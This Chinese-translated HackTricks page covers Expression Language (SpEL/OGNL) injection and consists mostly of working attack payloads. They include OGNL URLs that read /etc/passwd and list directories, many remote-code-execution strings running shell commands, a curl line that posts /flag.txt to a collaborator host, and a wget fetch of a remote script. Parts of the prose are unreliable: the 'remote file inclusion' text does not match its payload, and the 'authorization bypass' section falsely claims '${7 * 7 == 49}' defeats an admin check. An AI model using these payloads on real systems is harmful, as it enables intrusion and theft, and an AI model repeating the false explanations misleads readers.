# EL - 表达式语言

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF 版本**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

## 基本信息

EL 提供了一个重要的机制，用于使表示层（网页）与应用逻辑（托管的 bean）进行通信。

### 它在哪里使用？

1. **Spring 框架**：安全性、数据等
2. **任何开发人员使用 SpEL API 的地方**
3. 对于语言，它可以在 Java、Kotlin、Scala 和其他基于 JVM 的技术中使用。

EL 被**多个 JavaEE 技术**使用，例如 JavaServer Faces 技术、JavaServer Pages (JSP) 技术和 Java EE 的上下文和依赖注入（CDI）。EL 也可以在独立环境中使用。

Java 应用程序**很容易识别**，因为它们倾向于使用扩展名为**.jsp**或**.jsf**，抛出**堆栈错误**并在头部使用**"Serverlet"**这样的术语。

{% hint style="info" %}
根据**EL 版本**，某些**功能**可能是**开启**或**关闭**的，通常某些**字符**可能是**不允许**的。
{% endhint %}

## 基本示例

（你可以在[https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/](https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/)找到另一个有趣的关于 EL 的教程）

从 [**Maven**](https://mvnrepository.com) 仓库下载以下 jar 文件：

* `commons-lang3-3.9.jar`
* `spring-core-5.2.1.RELEASE.jar`
* `commons-logging-1.2.jar`
* `spring-expression-5.2.1.RELEASE.jar`

并创建以下 `Main.java` 文件：
```java
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class Main {
public static ExpressionParser PARSER;

public static void main(String[] args) throws Exception {
PARSER = new SpelExpressionParser();

System.out.println("Enter a String to evaluate:");
java.io.BufferedReader stdin = new java.io.BufferedReader(new java.io.InputStreamReader(System.in));
String input = stdin.readLine();
Expression exp = PARSER.parseExpression(input);
String result = exp.getValue().toString();
System.out.println(result);
}
}
```
接下来编译代码（如果您没有安装`javac`，请安装`sudo apt install default-jdk`）：
```java
javac -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:. Main.java
```
使用以下命令执行应用程序：
```java
java -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:. Main
Enter a String to evaluate:
{5*5}
[25]
```
请注意，在上一个示例中，术语`{5*5}`被**评估**了。

## **CVE示例**

从你已经看到的，我敢打赌你知道接下来会发生什么。如果开发人员正在使用SpEL与用户输入，我们需要创建一个带有注入的有效负载。让我们来看一个允许远程代码执行（RCE）的例子。它是作为[CVE-2017-8046](https://github.com/m3ssap0/SpringBreakVulnerableApp)漏洞利用的一部分而创建的。

![Image for post](https://miro.medium.com/max/1933/1\*qyl6ZLeJOyXmxmdqMcT8tg.png)

它由3个部分组成：

* 黑色 - 将命令执行的结果直接复制到HTTP请求的输出流中
* 红色 - 获取Java Runtime并在系统中执行命令
* 蓝色 - 包含命令的字符串：`cmd /c dir`。为了使其更健壮，命令的各个字符都从数字中解码。

执行结果：

![Image for post](https://miro.medium.com/max/982/1\*APSYwU3qbw0rNJAd2xhdNA.png)

## 有效负载

### 基本操作
```bash
#Basic string operations examples
{"a".toString()}
[a]

{"dfd".replace("d","x")}
[xfx]

#Access to the String class
{"".getClass()}
[class java.lang.String]

#Access ro the String class bypassing "getClass"
#{""["class"]}

#Access to arbitrary class
{"".getClass().forName("java.util.Date")}
[class java.util.Date]

#List methods of a class
{"".getClass().forName("java.util.Date").getMethods()[0].toString()}
[public boolean java.util.Date.equals(java.lang.Object)]
```
### 检测

* Burp检测
```bash
gk6q${“zkz”.toString().replace(“k”, “x”)}doap2
#The value returned was "igk6qzxzdoap2", indicating of the execution of the expression.
```
* J2EE检测
```bash
#J2EEScan Detection vector (substitute the content of the response body with the content of the “INJPARAM” parameter concatenated with a sum of integer):
https://www.example.url/?vulnerableParameter=PRE-${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.print(new%20java.lang.Integer(829%2b9))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}-POST&INJPARAM=HOOK_VAL
```
* 等待10秒钟
```bash
#Blind detection vector (sleep during 10 seconds)
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40java.lang.Thread%40sleep(10000)%2c1%3f%23xx%3a%23request.toString}
```
### 远程文件包含

Remote File Inclusion（远程文件包含）是一种服务器端模板注入（Server-Side Template Injection，SSTI）攻击技术。它利用了应用程序中的漏洞，允许攻击者在服务器上执行远程文件。这种攻击通常发生在应用程序使用用户提供的输入来动态包含文件的情况下。

攻击者可以通过构造恶意的请求，将远程文件的内容包含到应用程序的响应中。这可能导致敏感信息泄露、服务器端代码执行、远程命令执行等安全问题。

远程文件包含漏洞通常出现在应用程序中使用了不安全的文件包含函数或者没有正确过滤用户输入的情况下。攻击者可以利用这些漏洞来注入恶意代码，从而执行任意的服务器端操作。

为了防止远程文件包含漏洞，开发人员应该遵循安全的编码实践，包括正确过滤和验证用户输入、使用安全的文件包含函数、限制文件包含路径等。此外，定期更新和修补应用程序中的漏洞也是非常重要的。
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=new%20java.io.FileInputStream(%23wwww),%23qqqq=new%20java.lang.Long(%23wwww.length()),%23tttt=new%20byte[%23qqqq.intValue()],%23llll=%23pppp.read(%23tttt),%23pppp.close(),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(new+java.lang.String(%23tttt))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=%2fetc%2fpasswd
```
### 目录列表

Directory listing is a feature provided by web servers that allows users to view the contents of a directory on a website. It can be useful for navigating through the files and folders on a website, but it can also pose a security risk if sensitive information is exposed.

目录列表是由Web服务器提供的功能，允许用户查看网站上目录的内容。它可以帮助用户浏览网站上的文件和文件夹，但如果敏感信息被公开，也可能带来安全风险。

By default, many web servers have directory listing enabled for directories that do not contain an index file (such as index.html or index.php). This means that if a directory does not have an index file, the server will display a list of all the files and folders within that directory.

默认情况下，许多Web服务器对不包含索引文件（如index.html或index.php）的目录启用了目录列表功能。这意味着如果一个目录没有索引文件，服务器将显示该目录中所有文件和文件夹的列表。

From a security perspective, directory listing can be problematic because it can reveal sensitive information about the website's structure and files. Attackers can use this information to identify potential vulnerabilities or access files that were not intended to be publicly accessible.

从安全角度来看，目录列表可能存在问题，因为它可以揭示有关网站结构和文件的敏感信息。攻击者可以利用这些信息来识别潜在的漏洞或访问本不应公开访问的文件。

To mitigate the risk of directory listing, it is recommended to disable directory listing on the web server. This can usually be done by modifying the server's configuration file or using a web application firewall (WAF) to block directory listing requests.

为了减轻目录列表的风险，建议在Web服务器上禁用目录列表。通常可以通过修改服务器的配置文件或使用Web应用程序防火墙（WAF）来阻止目录列表请求来实现。

Additionally, it is important to ensure that sensitive files and directories are properly protected and not accessible through directory listing. This can be achieved by placing an index file in each directory or using access control mechanisms to restrict access to sensitive files.

此外，重要的是确保敏感文件和目录得到适当的保护，并且不能通过目录列表访问。可以通过在每个目录中放置索引文件或使用访问控制机制来限制对敏感文件的访问来实现这一点。
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=%23wwww.listFiles(),%23qqqq=@java.util.Arrays@toString(%23pppp),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23qqqq)%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=..
```
### RCE

* RCE的基本**解释**
```bash
#Check the method getRuntime is there
{"".getClass().forName("java.lang.Runtime").getMethods()[6].toString()}
[public static java.lang.Runtime java.lang.Runtime.getRuntime()]

#Execute command (you won't see the command output in the console)
{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://127.0.0.1:8000")}
[Process[pid=10892, exitValue=0]]

#Execute command bypassing "getClass"
#{""["class"].forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl <instance>.burpcollaborator.net")}

# With HTMl entities injection inside the template
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```
* RCE **linux**
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="%2fbin%2fsh",%23ssss[1]="%2dc",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
```
* RCE **Windows**（未经测试）
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="cmd",%23ssss[1]="%2fC",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
```
* **更多的远程命令执行（RCE）**
```java
// Common RCE payloads
''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()

// Method using Runtime via getDeclaredConstructors
#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
#{session.getAttribute("rtc").setAccessible(true)}
#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}

// Method using processbuilder
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("cmd.exe")}
${request.getAttribute("c").add("/k")}
${request.getAttribute("c").add("ping x.x.x.x")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
${request.getAttribute("a")}

// Method using Reflection & Invoke
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}

// Method using ScriptEngineManager one-liner
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}

// Method using ScriptEngineManager
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");

//https://github.com/marcin33/hacking/blob/master/payloads/spel-injections.txt
(T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec("cmd "+T(java.lang.String).valueOf(T(java.lang.Character).toChars(0x2F))+"c "+T(java.lang.String).valueOf(new char[]{T(java.lang.Character).toChars(100)[0],T(java.lang.Character).toChars(105)[0],T(java.lang.Character).toChars(114)[0]})).getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()))
T(java.lang.System).getenv()[0]
T(java.lang.Runtime).getRuntime().exec('ping my-domain.com')
T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cmd /c dir").getInputStream())
''.class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')
```
### 检查环境

* `applicationScope` - 全局应用程序变量
* `requestScope` - 请求变量
* `initParam` - 应用程序初始化变量
* `sessionScope` - 会话变量
* `param.X` - 参数值，其中X是http参数的名称

您需要将这些变量转换为字符串，例如：
```bash
${sessionScope.toString()}
```
#### 授权绕过示例

In some cases, the server-side template injection vulnerability can be used to bypass authorization checks and access restricted functionality or data. One common technique is to inject an expression that evaluates to true in the context of the authorization check.

在某些情况下，服务器端模板注入漏洞可以用于绕过授权检查并访问受限功能或数据。一种常见的技术是注入一个在授权检查上下文中评估为true的表达式。

For example, let's say there is an application that uses a template engine that supports Expression Language (EL). The application has an authorization check that verifies if the user is an administrator before allowing access to certain functionality.

例如，假设有一个使用支持表达式语言（EL）的模板引擎的应用程序。该应用程序在允许访问某些功能之前，会进行一个验证，以验证用户是否为管理员。

The authorization check might look something like this:

授权检查可能如下所示：

```java
if (user.isAdmin()) {
    // Allow access to restricted functionality
} else {
    // Deny access
}
```

To bypass this authorization check, an attacker can inject an EL expression that evaluates to true. For example, the following payload can be injected:

为了绕过这个授权检查，攻击者可以注入一个评估为true的EL表达式。例如，可以注入以下有效载荷：

```
${7 * 7 == 49}
```

When the template engine evaluates this expression, it will return true, bypassing the authorization check and allowing the attacker to access the restricted functionality.

当模板引擎评估这个表达式时，它将返回true，绕过授权检查，允许攻击者访问受限功能。

It's important to note that the specific syntax and behavior of EL expressions may vary depending on the template engine being used. Therefore, it's crucial to understand the syntax and capabilities of the template engine in order to craft effective payloads.

需要注意的是，EL表达式的具体语法和行为可能因所使用的模板引擎而异。因此，了解模板引擎的语法和功能是非常重要的，以便构造有效的有效载荷。
```bash
${pageContext.request.getSession().setAttribute("admin", true)}
```
应用程序还可以使用自定义变量，例如：
```bash
${user}
${password}
${employee.FirstName}
```
## WAF绕过

查看[https://h1pmnh.github.io/post/writeup\_spring\_el\_waf\_bypass/](https://h1pmnh.github.io/post/writeup\_spring\_el\_waf\_bypass/)

## 参考资料

* [https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/](https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/)
* [https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#tools](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#tools)
* [https://github.com/marcin33/hacking/blob/master/payloads/spel-injections.txt](https://github.com/marcin33/hacking/blob/master/payloads/spel-injections.txt)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
